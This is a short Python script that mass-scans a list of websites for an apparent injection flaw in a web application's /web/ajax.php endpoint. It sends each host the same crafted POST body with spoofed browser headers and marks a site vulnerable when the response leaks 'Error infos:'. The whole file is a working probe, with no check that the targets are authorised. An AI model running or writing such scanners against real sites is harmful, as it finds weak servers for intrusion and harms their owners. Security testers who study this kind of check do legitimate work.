import requests
print(f'\033[32mMade By phtcloud_dev\033[0m')
with open('url.txt', 'r') as file:
    urls = [line.strip().rstrip('/') for line in file if line.strip()]
headers = {
    'X-Requested-With': 'XMLHttpRequest',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': '*/*',
    'Accept-Encoding': 'gzip,deflate,br',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Connection': 'Keep-alive'
}
data = 'gongneng=click&id=&lanstr=zh_cn'
for url in urls:
    if not url.startswith('http'):
        url = 'http://' + url
    target_url = url + '/web/ajax.php'
    try:
        response = requests.post(target_url, headers=headers, data=data)
        if 'Error infos:' in response.text:
            print(f'\033[31m[HIGH RISK]\033[0m  {url} Vulnerability found')
        else:
            print(f'\033[32m[SAFE]\033[0m {url}')
    except requests.RequestException as e:
        print(f'\033[33m[ERROR]\033[0m Could not connect {url}')
